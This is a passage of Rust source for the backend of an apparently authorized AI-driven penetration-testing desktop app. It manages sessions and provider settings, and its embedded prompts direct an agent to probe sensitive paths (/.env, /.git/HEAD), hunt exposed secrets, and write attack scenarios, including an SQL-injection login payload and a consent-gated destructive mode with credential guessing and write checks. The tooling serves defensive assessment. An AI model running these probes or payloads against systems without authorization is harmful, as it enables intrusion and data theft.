// RedCell Desktop — Tauri v2 백엔드.
//
// 역할:
//   1) 세션(engagement)을 디스크에 JSON 으로 저장/조회/삭제한다.
//   2) 세션 실행 시 형제 프로젝트 `redcell` 의 CLI 를 `--ndjson` 으로 띄우고,
//      stdout 의 NDJSON 이벤트를 파싱해 프론트엔드로 실시간 스트리밍한다.
//
// 안전: 이 앱은 공격력을 새로 만들지 않는다. 모든 액션은 redcell 의 ScopeGuard
//       (authorization.yaml)를 그대로 통과한다. 이 프로세스는 "관측/표시" 계층이다.

#![cfg_attr(all(not(debug_assertions), target_os = "windows"), windows_subsystem = "windows")]

use std::collections::HashMap;
use std::fs;
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStderr, ChildStdout, Command, Stdio};
use std::sync::Mutex;
use std::thread;

use chrono::Utc;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tauri::{AppHandle, Emitter, Manager};
use uuid::Uuid;

mod auth;
mod probes;
mod risk;

/// 세션 파일 read-modify-write 직렬화용 락(stdout/stderr 스레드 경합 방지).
struct IoGuard(Mutex<()>);

/// 실행 중인 redcell 자식 프로세스 레지스트리(세션 id → Child). 중지 시 kill 용도.
struct Procs(Mutex<HashMap<String, Child>>);

#[derive(Serialize, Deserialize, Clone)]
struct ChatMessage {
    role: String, // "user" | "assistant" | "system"
    content: String,
    ts: String,
}

#[derive(Serialize, Deserialize, Clone)]
struct Session {
    id: String,
    name: String,
    host: String,
    #[serde(default)]
    port: Option<u16>,
    #[serde(default)]
    goal: String,
    #[serde(default = "default_provider")]
    provider: String,
    #[serde(default = "default_mode")]
    mode: String, // tools(고정 툴박스 오케스트레이터) | python(absolute-agent RLM)
    #[serde(default)]
    max: bool, // 공격 최대 모드(tools) — 전수 커버리지 + opt-in 전체 + python_exec
    #[serde(default)]
    diag: bool, // 서비스 진단 모드 — 설명 기반 공격 포인트/개선 권고 리포트
    #[serde(default)]
    deep: bool, // 심층 진단 — 병렬 워커 N개 + collector fan-in (prime-agent builder 패턴)
    #[serde(default)]
    engine: String, // 실행 엔진: ""|"pi" = pi-coding-agent, "prime" = prime-agent(Rust 하네스)
    #[serde(default)]
    auth_cookie: String, // 인증 스윕용 세션 쿠키 (Cookie 헤더 값, 사용자가 붙여넣음)
    #[serde(default)]
    danger_consent: bool, // 파괴적 진단 동의 (모달 명시 동의, 세션별, 철회 가능)
    #[serde(default)]
    danger_consented_at: String, // 동의 시각 (RFC3339, 감사 추적용)
    #[serde(default)]
    piq: String, // prime 모드: pi 세션 id(연속 대화 유지)
    #[serde(default = "status_idle")]
    status: String, // idle | running | done | error
    created_at: String,
    updated_at: String,
    #[serde(default)]
    chat: Vec<ChatMessage>,
    #[serde(default)]
    events: Vec<Value>,
}

fn default_provider() -> String {
    String::new() // mock 프로바이더는 존재하지 않는다 — 미지정 = 선택 안 함
}
fn default_mode() -> String {
    // 기본은 prime-agent(pi) 직접 실행 — 위에 대상 URL/호스트를 넣고 지시하면 CLI 처럼 쓴다.
    "prime".into()
}
fn status_idle() -> String {
    "idle".into()
}

#[derive(Serialize, Deserialize, Clone, Default)]
struct ProviderConn {
    #[serde(default)]
    api_key: String,
    #[serde(default)]
    base_url: String,
    #[serde(default)]
    model: String,
    /// pi models.json 의 API 방언 — ""(기본)=openai-completions, "anthropic-messages".
    /// custom 카드에서 선택한다 (Databricks AI Gateway 같은 Anthropic 경로용).
    #[serde(default)]
    api: String,
}

#[derive(Serialize, Deserialize, Clone, Default)]
struct Settings {
    #[serde(default)]
    redcell_dir: String,
    #[serde(default)]
    auth_path: String,
    #[serde(default)]
    default_provider: String,
    /// 사용자가 데스크톱 설정에서 직접 입력한 연결 정보(API 키/base URL/모델).
    /// 세션 실행 시 자식 프로세스의 환경변수로 주입된다.
    #[serde(default)]
    providers: HashMap<String, ProviderConn>,
}

fn now() -> String {
    Utc::now().to_rfc3339()
}

// ── 경로 헬퍼 ────────────────────────────────────────────────────────────────
fn root(app: &AppHandle) -> PathBuf {
    let dir = app.path().app_data_dir().unwrap_or_else(|_| PathBuf::from("."));
    fs::create_dir_all(&dir).ok();
    dir
}
fn sessions_dir(app: &AppHandle) -> PathBuf {
    let d = root(app).join("sessions");
    fs::create_dir_all(&d).ok();
    d
}
fn settings_file(app: &AppHandle) -> PathBuf {
    root(app).join("settings.json")
}
fn session_file(app: &AppHandle, id: &str) -> PathBuf {
    sessions_dir(app).join(format!("{id}.json"))
}

fn read_session(app: &AppHandle, id: &str) -> Option<Session> {
    let txt = fs::read_to_string(session_file(app, id)).ok()?;
    serde_json::from_str(&txt).ok()
}

fn write_session_locked(app: &AppHandle, s: &Session) {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    if let Ok(txt) = serde_json::to_string_pretty(s) {
        fs::write(session_file(app, &s.id), txt).ok();
    }
}

/// 세션에 이벤트 하나를 append (읽기-수정-쓰기를 락으로 원자화).
/// 이벤트에 `_ts`(epoch millis)·`_seq`(순번)를 찍어 UI 의 캡처 테이블이
/// 시간·순번 컬럼을 그릴 수 있게 한다. 저장된 값과 동일한 stamped 이벤트를 반환한다.
fn append_event(app: &AppHandle, id: &str, ev: &Value) -> Value {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let p = session_file(app, id);
    let mut stamped = ev.clone();
    let Some(mut s) = fs::read_to_string(&p)
        .ok()
        .and_then(|t| serde_json::from_str::<Session>(&t).ok())
    else {
        return stamped;
    };
    if let Some(obj) = stamped.as_object_mut() {
        obj.entry("_ts").or_insert(json!(Utc::now().timestamp_millis()));
        obj.entry("_seq").or_insert(json!(s.events.len()));
    }
    s.events.push(stamped.clone());
    s.updated_at = now();
    if let Ok(txt) = serde_json::to_string_pretty(&s) {
        fs::write(p, txt).ok();
    }
    stamped
}

fn set_status(app: &AppHandle, id: &str, status: &str) {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let p = session_file(app, id);
    if let Some(mut s) = fs::read_to_string(&p)
        .ok()
        .and_then(|t| serde_json::from_str::<Session>(&t).ok())
    {
        s.status = status.to_string();
        s.updated_at = now();
        if let Ok(txt) = serde_json::to_string_pretty(&s) {
            fs::write(p, txt).ok();
        }
    }
}

/// redcell 프로젝트 위치 추정: 환경변수 → cwd 상대 → 실행파일 상위 경로.
fn guess_redcell_dir() -> Option<String> {
    if let Ok(env) = std::env::var("REDCELL_DIR") {
        if !env.trim().is_empty() {
            return Some(env);
        }
    }
    let mut cands: Vec<PathBuf> = Vec::new();
    if let Ok(cwd) = std::env::current_dir() {
        cands.push(cwd.join("../redcell"));
        cands.push(cwd.join("../../redcell"));
        cands.push(cwd.join("../../../redcell"));
    }
    if let Ok(exe) = std::env::current_exe() {
        let mut a: &Path = exe.as_path();
        for _ in 0..7 {
            if let Some(p) = a.parent() {
                cands.push(p.join("redcell"));
                a = p;
            } else {
                break;
            }
        }
    }
    for c in cands {
        if c.join("src/cli.ts").exists() {
            return Some(
                fs::canonicalize(&c)
                    .unwrap_or(c)
                    .to_string_lossy()
                    .to_string(),
            );
        }
    }
    None
}

// ── 커맨드 ───────────────────────────────────────────────────────────────────
#[tauri::command]
fn get_settings(app: AppHandle) -> Settings {
    let mut s: Settings = fs::read_to_string(settings_file(&app))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default();
    if s.redcell_dir.trim().is_empty() {
        if let Some(dir) = guess_redcell_dir() {
            s.redcell_dir = dir;
        }
    }
    // 기본 내장 연결 심기 — LGE AIGW MLflow Responses 엔드포인트를 설정 없이
    // 바로 쓰게 한다. 키는 사용자가 카드에 직접 붙여넣는 Databricks 토큰이며,
    // 비어 있으면 pi 가 "--api-key 미지정"으로 실패하고 안내 메시지를 낸다.
    // 사용자가 카드를 비우면 다음 로드에서 다시 심긴다.
    if !s.providers.contains_key("lge-aigw") {
        s.providers.insert(
            "lge-aigw".to_string(),
            ProviderConn {
                api_key: String::new(),
                base_url: String::new(), // 빈 값 = 카탈로그 기본 base URL 사용
                model: "system.ai.glm-5-3-flash".into(),
                api: "openai-responses".into(),
            },
        );
    } else if let Some(conn) = s.providers.get_mut("lge-aigw") {
        // 구버전 기본값(`!ug auth-token` + Anthropic 경로)에서 새 기본값으로 이행 —
        // 셸 명령 키 해석은 데스크톱 실행 환경에 따라 실패하기 쉽다(핑 오류 원인).
        // 정확히 구버전 기본 조합일 때만 되돌리고, 사용자가 쓴 값은 존중한다.
        let old_default = conn.api_key.trim() == "!ug auth-token"
            && conn.base_url.trim().is_empty()
            && (conn.api.trim() == "anthropic-messages" || conn.api.trim().is_empty());
        if old_default {
            conn.api_key = String::new();
            conn.base_url = String::new();
            conn.api = "openai-responses".into();
        }
    }
    if s.default_provider.trim().is_empty() || s.default_provider == "mock" {
        s.default_provider = "lge-aigw".into();
    }
    s
}

#[tauri::command]
fn save_settings(app: AppHandle, settings: Settings) -> Result<Settings, String> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let txt = serde_json::to_string_pretty(&settings).map_err(|e| e.to_string())?;
    fs::write(settings_file(&app), txt).map_err(|e| e.to_string())?;
    Ok(settings)
}

#[tauri::command]
fn list_sessions(app: AppHandle) -> Vec<Session> {
    let mut out: Vec<Session> = Vec::new();
    if let Ok(rd) = fs::read_dir(sessions_dir(&app)) {
        for e in rd.flatten() {
            if e.path().extension().and_then(|x| x.to_str()) == Some("json") {
                if let Some(s) = fs::read_to_string(e.path())
                    .ok()
                    .and_then(|t| serde_json::from_str::<Session>(&t).ok())
                {
                    out.push(s);
                }
            }
        }
    }
    out.sort_by(|a, b| b.updated_at.cmp(&a.updated_at));
    out
}

#[tauri::command]
fn get_session(app: AppHandle, id: String) -> Option<Session> {
    read_session(&app, &id)
}

#[tauri::command]
fn create_session(
    app: AppHandle,
    name: String,
    host: String,
    port: Option<u16>,
    goal: String,
    provider: String,
    mode: Option<String>,
    max: Option<bool>,
    diag: Option<bool>,
    deep: Option<bool>,
    engine: Option<String>,
    auth_cookie: Option<String>,
) -> Session {
    let id = Uuid::new_v4().to_string();
    let s = Session {
        name: if name.trim().is_empty() {
            format!("session-{}", &id[..8])
        } else {
            name
        },
        host,
        port,
        goal,
        provider: if provider.trim().is_empty() {
            String::new() // mock 제거 — 미지정이면 UI가 프로바이더 선택 모달로 안내
        } else {
            provider
        },
        mode: match mode {
            Some(m) if !m.trim().is_empty() => m,
            _ => default_mode(),
        },
        max: max.unwrap_or(false),
        diag: diag.unwrap_or(false),
        deep: deep.unwrap_or(false),
        engine: engine.unwrap_or_default(),
        auth_cookie: auth_cookie.unwrap_or_default(),
        danger_consent: false,
        danger_consented_at: String::new(),
        piq: String::new(),
        status: "idle".into(),
        created_at: now(),
        updated_at: now(),
        chat: Vec::new(),
        events: Vec::new(),
        id,
    };
    write_session_locked(&app, &s);
    s
}

#[tauri::command]
fn update_session(
    app: AppHandle,
    id: String,
    name: String,
    host: String,
    port: Option<u16>,
    goal: String,
    provider: String,
    mode: Option<String>,
    max: Option<bool>,
    diag: Option<bool>,
    deep: Option<bool>,
    engine: Option<String>,
    auth_cookie: Option<String>,
) -> Option<Session> {
    let mut s = read_session(&app, &id)?;
    s.name = name;
    s.host = host;
    s.port = port;
    s.goal = goal;
    s.provider = provider;
    if let Some(m) = mode {
        if !m.trim().is_empty() {
            s.mode = m;
        }
    }
    if let Some(mx) = max {
        s.max = mx;
    }
    if let Some(d) = diag {
        s.diag = d;
    }
    if let Some(dd) = deep {
        s.deep = dd;
    }
    if let Some(e) = engine {
        s.engine = e;
    }
    if let Some(c) = auth_cookie {
        s.auth_cookie = c;
    }
    s.updated_at = now();
    write_session_locked(&app, &s);
    Some(s)
}

/// 파괴적 진단 동의 설정 — 동의 모달의 명시 확인 전용 커맨드.
/// 동의 시 시각을 찍고 감사 노트를 남긴다. 철회는 즉시 반영된다.
#[tauri::command]
fn set_danger_consent(app: AppHandle, id: String, consent: bool) -> Option<Session> {
    let mut s = read_session(&app, &id)?;
    s.danger_consent = consent;
    s.danger_consented_at = if consent { now() } else { String::new() };
    s.updated_at = now();
    write_session_locked(&app, &s);
    let text = if consent {
        "[경고] 파괴적 진단 동의됨 — 기본자격 시도·IDOR 인접 확인·쓰기 검증이 다음 진단부터 실행됩니다. (세션별, 언제든 철회 가능)"
    } else {
        "[sys] 파괴적 진단 동의 철회 — 읽기 전용 모드로 복귀합니다."
    };
    let ev = json!({ "type": "note", "text": text });
    let stamped = append_event(&app, &id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    Some(s)
}

#[tauri::command]
fn delete_session(app: AppHandle, id: String) -> Result<(), String> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    fs::remove_file(session_file(&app, &id)).map_err(|e| e.to_string())
}

#[tauri::command]
fn append_chat(app: AppHandle, id: String, role: String, content: String) -> Option<Session> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let p = session_file(&app, &id);
    let mut s: Session = fs::read_to_string(&p)
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())?;
    s.chat.push(ChatMessage {
        role,
        content,
        ts: now(),
    });
    s.updated_at = now();
    fs::write(&p, serde_json::to_string_pretty(&s).ok()?).ok();
    Some(s)
}

/// 엔진 레지스트리(redcell/src/providers/registry.ts)와 동일하게 유지한다.
struct ProviderMeta {
    name: &'static str,
    kind: &'static str,
    note: &'static str,
    default_model: &'static str,
    env_keys: &'static [&'static str],
    base_url: &'static str,
    needs_base: bool,
}
const PROVIDER_CATALOG: &[ProviderMeta] = &[
    ProviderMeta { name: "anthropic", kind: "anthropic", note: "Claude 공식 API", default_model: "claude-opus-5", env_keys: &["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"], base_url: "https://api.anthropic.com/v1", needs_base: false },
    ProviderMeta { name: "openai", kind: "openai-compat", note: "GPT 공식 API", default_model: "gpt-5.4", env_keys: &["OPENAI_API_KEY"], base_url: "https://api.openai.com/v1", needs_base: false },
    ProviderMeta { name: "openrouter", kind: "openai-compat", note: "다수 모델 게이트웨이 — 무료 모델은 모델란에 `:free`(예: meta-llama/llama-3.3-70b-instruct:free)", default_model: "moonshotai/kimi-k2.6", env_keys: &["OPENROUTER_API_KEY"], base_url: "https://openrouter.ai/api/v1", needs_base: false },
    ProviderMeta { name: "prime-inference", kind: "openai-compat", note: "Prime Intellect inference", default_model: "z-ai/glm-5.2", env_keys: &["PRIME_API_KEY"], base_url: "https://api.pinference.ai/api/v1", needs_base: false },
    ProviderMeta { name: "groq", kind: "openai-compat", note: "고속 추론", default_model: "openai/gpt-oss-120b", env_keys: &["GROQ_API_KEY"], base_url: "https://api.groq.com/openai/v1", needs_base: false },
    ProviderMeta { name: "cerebras", kind: "openai-compat", note: "Cerebras 초고속 추론", default_model: "gpt-oss-120b", env_keys: &["CEREBRAS_API_KEY"], base_url: "https://api.cerebras.ai/v1", needs_base: false },
    ProviderMeta { name: "xai", kind: "openai-compat", note: "xAI Grok", default_model: "grok-4.20-0309-reasoning", env_keys: &["XAI_API_KEY"], base_url: "https://api.x.ai/v1", needs_base: false },
    ProviderMeta { name: "deepseek", kind: "openai-compat", note: "DeepSeek", default_model: "deepseek-v4-pro", env_keys: &["DEEPSEEK_API_KEY"], base_url: "https://api.deepseek.com", needs_base: false },
    ProviderMeta { name: "mistral", kind: "openai-compat", note: "Mistral AI", default_model: "devstral-medium-latest", env_keys: &["MISTRAL_API_KEY"], base_url: "https://api.mistral.ai/v1", needs_base: false },
    ProviderMeta { name: "moonshotai", kind: "openai-compat", note: "Moonshot Kimi", default_model: "kimi-k2.6", env_keys: &["MOONSHOT_API_KEY"], base_url: "https://api.moonshot.ai/v1", needs_base: false },
    ProviderMeta { name: "zai", kind: "openai-compat", note: "Z.ai GLM", default_model: "glm-5.1", env_keys: &["ZAI_API_KEY"], base_url: "https://api.z.ai/api/coding/paas/v4", needs_base: false },
    // 기본 내장 연결 — LGE Databricks AI Gateway MLflow Responses 엔드포인트.
    // 키는 사용자가 ⚙ 설정 > 프로바이더 카드에 직접 붙여넣는 Databricks 토큰
    // ($DATABRICKS_TOKEN, ug auth-token 출력과 동일) — CLI --api-key 로 주입되므로
    // 셸 명령 해석(!command)에 의존하지 않는다.
    ProviderMeta { name: "lge-aigw", kind: "openai-compat", note: "LGE Databricks AI Gateway — Responses API (키: Databricks 토큰을 키란에 직접 입력)", default_model: "system.ai.glm-5-3-flash", env_keys: &[], base_url: "https://lge-esdatapf.cloud.databricks.com/ai-gateway/mlflow/v1", needs_base: false },
    ProviderMeta { name: "ollama", kind: "openai-compat", note: "로컬/원격 ollama 서버 (키 불필요)", default_model: "llama3.1", env_keys: &[], base_url: "http://localhost:11434/v1", needs_base: true },
    ProviderMeta { name: "custom", kind: "openai-compat", note: "임의 OpenAI 호환 엔드포인트 — vLLM·LM Studio·원격 ollama 등", default_model: "", env_keys: &["REDCELL_OPENAI_API_KEY"], base_url: "", needs_base: true },
];

/// 서비스 진단 역할 + 실측 정찰 지시 (단일 진단·심층 collector 공용 토대).
const DIAG_ROLE: &str = r#"# RedCell 서비스 진단 — 시니어 해커 멘토

당신은 10년차 시니어 해커다. 지금 주니어 해커를 가르치듯, 이 서비스에서
**실제로 해킹이 어떻게 가능한지** 시나리오 단위로 보여주고, 각 시나리오마다
"왜 가능한지(원리)"와 "어떻게 막는지(구체적 코드·설정)"를 함께 설명한다.
독자는 해킹을 모르는 서비스 담당자 + 주니어 보안 담당자다.

대상 URL 이 주어졌으면 보고서를 쓰기 전에 **반드시** 아래 실측 정찰을 먼저
수행하고, 확보한 실제 응답·헤더·상태로 서비스 모델을 세운다.
(P0 자동 스윕 증거([P-###])가 함께 주어지면 그것을 우선 사용하고, 빈틈만
아래 순서로 보완한다 — 이미 커버된 항목의 재프로브는 시간 낭비다.)

## 실측 정찰 순서 (URL 이 주어진 경우 — 보고서 작성 전 반드시)
모든 요청은 web_fetch, 비파괴 GET/HEAD 로만 한다:
① 홈페이지 GET + 응답 헤더 — 기술스택·서버·보안 헤더 점검
   (Content-Security-Policy, Strict-Transport-Security, X-Frame-Options,
   X-Content-Type-Options, Referrer-Policy, Server, X-Powered-By)
② 쿠키 플래그 (HttpOnly/Secure/SameSite) 점검
③ 홈페이지의 링크·폼·스크립트·JS 번들에서 엔드포인트·파라미터·API 수집(공격 표면)
④ 흔한 민감/설계 경로를 각각 한 번씩 프로브: /robots.txt, /.well-known/security.txt,
   /sitemap.xml, /openapi.json, /swagger, /admin, /login, /api, /health, /.env,
   /.git/HEAD, /config, /favicon.ico, /server-status
⑤ 리다이렉트·HTTPS 강제·응답 코드(200/301/302/403/404/500)로 배포·접근통제 정황 파악
⑥ JS 번들·openapi 문서에서 API 키·토큰·내부 URL 같은 비밀 문자열 탐색
정찰에서 실제로 본 것을 근거로만 단정하고, 못 본 것은 [가정] 으로 표기한다."#;

/// 최종 리포트 형식 + 집필 원칙 (단일 진단·심층 collector 공용).
const REPORT_SPEC: &str = r#"## 리포트 형식 (Markdown, 아래 구조를 지킨다 — UI 가 자동 시각화한다)
# 서비스 진단 리포트 — <서비스명>
## 0. 한눈에 보기 (맨 앞 요약 표)
  3줄 요약: 비전문가도 이해하는 "그래서 뭐가 위험한가" 3줄 (등급·최대 피해·급한 조치)
  | 루트 | 위험도 | 공격 방법 | 탈취 정보 | 보완 요약 |
  (각 시나리오를 한 행으로 — 비전문가도 표 하나로 전체 그림을 본다)
  P0 자동 스윕 요약 1줄: "자동 스윕 N개 프로브·M건 발견" + 심각도 분포.
  (시나리오에는 관련 증거 ID를 [P-###] 형태로 반드시 인용한다)
## 1. 진단 범위 및 가정
  - 기술 스택·아키텍처 추정 (설명에 없는 부분은 [가정] 으로 표시)
  - 진단 경계: 설명 기반 판단 vs 실측 확인
## 2. 공격 표면 (Attack Surface)
  인증·세션·권한 / 입력 처리 / 데이터 흐름 / 외부 연동 / 배포·설정 / 비즈니스 로직
  각 표면의 노출 경로와 진입점(예상 엔드포인트·함수·플로우)
## 3. 공격 시나리오 (위험도 순 — 시니어가 주니어에게 가르치듯 구체적으로)
  각 시나리오는 **반드시 아래 고정 형식**으로 작성한다 — UI 가 '공격 흐름
  다이어그램'·'단계 시뮬레이션'·'멘토 노트'·'탈취 정보 태그'로 시각화하므로
  라벨 줄을 정확히 지켜라:

  ### 루트 1. <공격 시나리오 이름> [높음]
  위험도: 높음                  (치명|높음|중간|낮음 중 하나)
  진입점: <공격자가 처음 닿는 지점 — URL/엔드포인트/화면/파일 등>
  공격 흐름: 공격자 → <진입점> → (<취약점/공격 기법>) → <중간 결과> → (<탈취>) → <최종 피해>
             예: 공격자 → 로그인 폼 → (SQL 주입) → 인증 우회 → (관리자 세션 탈취) →
             전체 사용자 개인정보 열람
             (→ 로 구분된 단계들. 취약점 단계는 ( ) 로, 정보 유출 단계도 ( ) 로 표기)
  탈취 정보: 이메일 주소, 비밀번호 해시, 세션 토큰, 결제 카드 정보
             (쉼표로 구분 — 무엇이 새는지 구체적일수록 좋음)
  공격 방법: 구체적 기법·페이로드 예시·도구 (주니어가 따라 할 수 있을 정도로)
  멘토 노트: 왜 이 공격이 가능한지 원리 설명 — 주니어를 가르치듯 쉽게, 2~4문장
             (예: "로그인 입력값을 SQL 문장에 그대로 이어붙이면, 공격자의 입력이
             코드가 된다. 그래서 참이 되는 조건을 넣으면 비밀번호 없이도 …")
  증거: 실제 확인한 응답·헤더·본문 발췌 1~3줄 (원문 그대로, 민감값은 뒤 4자리만)
  영향: 비즈니스 영향 (한 줄 — "결국 무엇이 어떻게 새는가")
  시뮬레이션: (UI 가 '이렇게 하면 → 이렇게 된다' 단계 재생 플레이어로 시각화)
    1. <공격자 행동 — 요청·페이로드·조작> → <시스템 결과/응답>
    2. <다음 행동> → <다음 결과>
    (숫자 번호 + '→' 한 쌍으로 2~4단계. 행동은 주니어가 따라 할 수 있을 만큼
    구체적으로 — 예: "id 에 ' OR '1'='1 입력 후 로그인 클릭 → 관리자 쿠키 발급 응답")
  검증: [실증] <어떻게 확인했는지 — web_fetch 실측 응답 근거>
        [징후] <부분 확인·정황 — 헤더, 설정, 오류 노출 등>
        [가정] <설명 기반 추론 — 실측 불가 사유>
        [실증]은 P0 증거 + P1 재확인(verify-*)이 있거나 직접 재현에 성공했을 때만 사용한다.
        (셋 중 하나만. URL 이 주어졌으면 핵심 루트는 실측 재현을 시도해 [실증]으로
        올리고, 재현 실패 시 [가정]으로 유지한다. 게으른 추측 금지)
  보완: 미리 막는 방법 — 복붙 가능한 코드·설정 예시를 포함해 2~5줄
        (코드·설정·프로세스 수준, 우회 가능성과 한계 포함)

  참고할 공격 기법 pool (여기서 뽑지 말고 서비스에 맞게 창의적으로 조합하라):
  주입류(SQLi·NoSQLi·명령·SSRF·SSTI), 인증·세션(JWT·OAuth·쿠키·토큰), 권한(IDOR·
  수평/수직 상승), 파일 업로드·경로, XXE·역직렬화, 레이스 컨디션, 캐시 오염, 요청
  스머글링, 비즈니스 로직 남용(할인·쿼터·순서·상태), 개인정보 노출, 유니코드·인코딩
  우회, 체인 공격(XSS→CSRF→관리자 권한 등), 재시도/타이밍 공격
## 4. 개선·보완 권고 (우선순위)
  각 항목: **우선순위(P0~P3) · 문제 · 구체적 보완 방법(복붙 가능한 코드·설정 포함) ·
  검증 방법**
## 5. 실측 확인 (URL 이 주어진 경우) — 정밀 검증 단계
  먼저 P0 자동 스윕 결과(프로브 수·발견 수·심각도 분포)를 3~5줄로 요약하고,
  각 시나리오의 검증 항목에 관련 증거 ID([P-###])를 명시한다. P0 증거와
  모순되는 시나리오는 삭제하거나 [가정]으로 강등한다.
  `verify-*`(P1 재확인 확정)와 `auth-inject`(로그인 injection 시도 결과) 발견이
  있으면 반드시 대응 시나리오로 작성한다 — 시도가 있었는데 리포트에서 빠지면 안 된다.
  위험도 높음/치명 시나리오는 반드시 web_fetch 로 **재현을 시도**하고(요청·응답·
  헤더·쿠키를 실제로 확인), 각 시나리오의 검증 상태를 갱신한다:
  - 재현 성공 → [실증] 으로 상향 (근거: 실제 응답 원문 기재)
  - 부분 확인(오류 노출·헤더·설정 파일 등) → [징후]
  - 재현 불가/미시도 → [가정] 유지 (어떤 시도를 했는지 기재)
  재현 동작은 비파괴(읽기·폼 검증 정도)로 제한하고, 실측 전후의 차이와 남은 미확인
  항목을 정리한다.

## 집필 원칙
- **비전문가 친화**: 시나리오마다 "결국 무엇이 어떻게 새는가"를 흐름·탈취 정보로
  한눈에 보이게 한다. 전문 용어는 괄호로 풀어 쓴다(예: (SQL 주입 = 입력값으로
  DB 질의를 조작)).
- **멘토링**: 모든 시나리오에 멘토 노트(왜 가능한지 원리)를 붙인다 — 리포트를 읽은
  주니어가 다음엔 스스로 찾을 수 있어야 한다.
- **창의성**: 잘 알려진 취약점뿐 아니라 조합·비즈니스 로직·운영 방식에서 나오는
  공격 시나리오를 발굴한다. 공격자 관점에서 "실제로 어떻게 성공하는가"를 구체적으로.
- **보완 중심**: 모든 공격 시나리오마다 반드시 "미리 막는 방법"을 복붙 가능한 수준으로
  제시한다 — 진단 리포트가 곧 개선 지침이 되도록.
- **정밀 검증**: 추측(가정)과 실측(실증)을 절대 섞지 않는다. 근거 없이 단정하거나
  위험도를 부풀리지 말 것 — 증거가 부족하면 [징후]나 [가정]으로 정직하게 낮춘다.
  검증 상태가 [실증]인 시나리오만 "확인된 취약점"으로 표현한다.
- 로컬 컴퓨터 파일은 조사하지 말 것. 웹 실측은 반드시 web_fetch 툴로만."#;

/// 심층 진단 워커 정의 — prime-agent builder(factory) 패턴의 워커/섹션에 대응.
/// 각 워커는 독립 pi 세션으로 동시에 실행되고, collector 가 결과를 병합한다.
struct DeepWorkerDef {
    id: &'static str,    // pi 세션 접미사 + 이벤트 태그
    label: &'static str, // UI 칩 표시 (W1·정찰)
    title: &'static str, // 담당 분야
    brief: &'static str, // 워커 전용 임무 지시
}
const DEEP_WORKERS: &[DeepWorkerDef] = &[
    DeepWorkerDef {
        id: "w1",
        label: "W1·정찰",
        title: "표면 정찰",
        brief: "홈페이지·헤더·쿠키·TLS·리다이렉트·민감 경로(/robots.txt, /.well-known/security.txt, /sitemap.xml, /openapi.json, /swagger, /admin, /login, /api, /health, /.env, /.git/HEAD, /server-status)를 비파괴 GET/HEAD 로 전수 조사하고, 링크·폼·스크립트·JS 번들에서 엔드포인트·파라미터·API 를 수집한다. 보안 헤더·쿠키 플래그 누락을 빠짐없이 기록한다.",
    },
    DeepWorkerDef {
        id: "w2",
        label: "W2·주입",
        title: "주입 공격",
        brief: "수집된 엔드포인트·파라미터에 SQL 주입·XSS(반사형, 무해 마커)·SSTI·SSRF·OS 명령 주입·경로 조작 신호를 비파괴 프로브로 탐지한다. 오류 메시지 노출·산술 평가·지연 응답 같은 신호를 증거 원문과 함께 기록한다. 파괴적 페이로드·대량 요청은 금지. 단, P0 증거에 danger-write(쓰기 검증)가 있으면 그 결과를 인용해 체인 시나리오(웹셸 경로·정리 여부 포함)를 작성한다.",
    },
    DeepWorkerDef {
        id: "w3",
        label: "W3·인증",
        title: "인증·세션·권한",
        brief: "로그인·회원가입·토큰(JWT/쿠키/OAuth) 흐름을 분석한다: 세션 고정·예측 가능성, 로그아웃 무효화, 탈취 시 영향, 무차별 대입 방어(레이트리밋·잠금), IDOR·수평/수직 권한 상승 신호를 비파괴 범위에서 확인하고 기록한다. P0 증거에 danger-creds(기본자격)·danger-idor(인접 확정)이 있으면 인용해 권한 탈취 체인을 작성한다(비밀번호 원문은 절대 복기하지 마라).",
    },
    DeepWorkerDef {
        id: "w4",
        label: "W4·노출",
        title: "노출·설정 오류",
        brief: "노출된 비밀·설정 오류를 찾는다: /.env·백업 파일·설정 파일, /.git, JS 번들·openapi 문서 속 API 키·토큰·내부 URL, 디버그·관리자 페이지, CORS 와일드카드, 상세 오류 스택 노출. P0의 upload-surface(업로드 폼)·methods(쓰기 메서드)·method-override 증거를 인용해 설정 보완안(실제 업로드·PUT 발송 없이)을 제시한다. 발견 원문(민감값 마스킹)을 증거로 기록한다.",
    },
    DeepWorkerDef {
        id: "w5",
        label: "W5·로직",
        title: "비즈니스 로직",
        brief: "서비스 설명과 실제 화면·API 흐름을 대조해 비즈니스 로직 남용 포인트를 발굴한다: 가격·할인·쿼터·순서·상태 전이 조작, 레이스 컨디션 가능 지점, 권한 단계 건너뛰기, 악용 가능한 정상 기능. 각 포인트마다 악용 시나리오 초안을 기록한다.",
    },
];

/// 심층 진단 워커용 지시문 — 독립 세션에서 한 분야만 깊게 파고든다.
fn deep_worker_instruction(
    def: &DeepWorkerDef,
    target: &str,
    goal: &str,
    https_hint: &str,
    mem: &str,
) -> String {
    format!(
        r#"# RedCell 심층 진단 워커 — {label} ({title})

당신은 시니어 해커 팀의 '{title}' 담당 전문가다. 아래 대상을 맡은 분야에서만
깊게 파고들어 발견 사항을 정리한다. 다른 워커가 다른 분야를 동시에 맡고 있으니
네 분야 외에는 손대지 마라.

대상 사이트(인가됨): {target}
{https_hint}
서비스 설명: {goal}

## 임무
{brief}

## 규칙
- 모든 웹 조회는 web_fetch 툴로, 비파괴 GET/HEAD(폼 검증 정도의 POST 허용)로만.
- 실제로 확인한 것만 증거(응답·헤더·본문 발췌, 민감값은 뒤 4자리만)와 함께 기록.
- 못 본 것은 [가정] 으로 표기하고 단정하지 마라.
- 이 컴퓨터의 파일 시스템(bash/read/edit/write)은 조사 대상이 아니다.
{mem}
## 출력 형식 (반드시 지킨다 — collector 가 병합한다)
## 워커 발견 ({label} {title})
- [치명|높음|중간|낮음|정보] <발견 제목> — <한 줄 설명> / 근거: <증거 발췌 또는 [가정]>
